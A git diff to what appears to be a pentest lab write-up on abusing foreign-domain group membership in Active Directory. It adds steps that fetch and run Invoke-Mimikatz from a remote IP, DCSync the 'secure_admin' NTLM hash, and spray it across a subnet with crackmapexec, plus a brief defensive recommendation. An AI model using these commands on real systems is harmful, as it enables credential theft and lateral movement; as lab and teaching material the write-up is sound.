@@ -98,37 +98,30 @@ After clicking on "Users with Foreign Domain Group Membership" and selecting `Se
 
 ![](<../../.gitbook/assets/image (75).png>)
 
-6\.&#x20;
+6\. Since we are already domain admin we could simply reset the password for the `secure_admin` user. But this isn't OPSEC safe, so we can execute a dcsync to grab its NTLM hash and then use it to spray against the other domain computers to check if the user has access to any machine. To execute the DCSync load MimiKatz into memory and use the following command:
 
+```
+iex (iwr http://192.168.248.2:8090/Invoke-Mimikatz.ps1 -UseBasicParsing)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:bank\secure_admin /domain:bank.local"'
+```
 
+![](<../../.gitbook/assets/image (16).png>)
 
+7\. The next step would be to spray this hash against all systems of the secure.local domain. But its just easier to spray it against the whole subnet with crackmapexec. To do this we use the following command:
 
+```
+cme smb 10.0.0.0/24 -u secure_admin -H a0f6b4d3c6a9da1204520ccd72e54597 -d bank.local
+```
 
+![](<../../.gitbook/assets/image (39).png>)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+8\. The user `secure_admin` from `bank.local` is local admin to the `DATA01` machine from `secure.local`.
 
 ## Defending
 
 ### Recommendations
 
-* a
+I would recommend to not add users from other domains in privileged groups if you don't FULLY trust the other domain to be secure. But this is a risk based decision to make.
 
 ### Detection
 
@@ -136,3 +129,4 @@ After clicking on "Users with Foreign Domain Group Membership" and selecting `Se
 
 ## References
 
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}
